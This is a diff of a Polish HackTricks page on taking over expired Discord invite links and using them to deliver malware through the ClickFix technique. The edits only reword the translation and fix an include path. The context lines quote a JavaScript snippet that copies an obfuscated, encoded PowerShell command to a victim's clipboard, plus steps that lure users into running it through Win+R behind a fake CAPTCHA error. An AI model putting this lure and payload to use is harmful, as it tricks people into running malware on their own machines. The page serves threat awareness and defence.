@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-Luka w systemie zaproszeń Discorda pozwala aktorom zagrożenia na przejęcie wygasłych lub usuniętych kodów zaproszeń (tymczasowych, stałych lub niestandardowych) jako nowych linków niestandardowych na każdym serwerze z poziomem 3. Normalizując wszystkie kody do małych liter, atakujący mogą wstępnie zarejestrować znane kody zaproszeń i cicho przejąć ruch, gdy oryginalny link wygaśnie lub źródłowy serwer straci swoje wzmocnienie.
+Wrażliwość systemu zaproszeń Discorda pozwala aktorom zagrożenia na przejęcie wygasłych lub usuniętych kodów zaproszeń (tymczasowych, stałych lub niestandardowych) jako nowych linków niestandardowych na każdym serwerze z poziomem 3. Normalizując wszystkie kody do małych liter, atakujący mogą wstępnie zarejestrować znane kody zaproszeń i cicho przejąć ruch, gdy oryginalny link wygaśnie lub źródłowy serwer straci swoje wzmocnienie.
 
 ## Typy zaproszeń i ryzyko przejęcia
 
@@ -35,7 +35,7 @@ Luka w systemie zaproszeń Discorda pozwala aktorom zagrożenia na przejęcie wy
 - Wyświetl komunikat o uszkodzonym CAPTCHA.
 - Poprowadź użytkowników do otwarcia okna dialogowego **Win+R**, wklejenia wstępnie załadowanej komendy PowerShell i naciśnięcia Enter.
 
-### Przykład wstrzyknięcia ClickFix do schowka
+### Przykład wstrzykiwania schowka ClickFix
 ```javascript
 // Copy malicious PowerShell command to clipboard
 const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
@@ -58,4 +58,4 @@ To podejście unika bezpośrednich pobrań plików i wykorzystuje znane elementy
 - From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
 - Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link
 
-{{#include /banners/hacktricks-training.md}}
+{{#include ../../banners/hacktricks-training.md}}
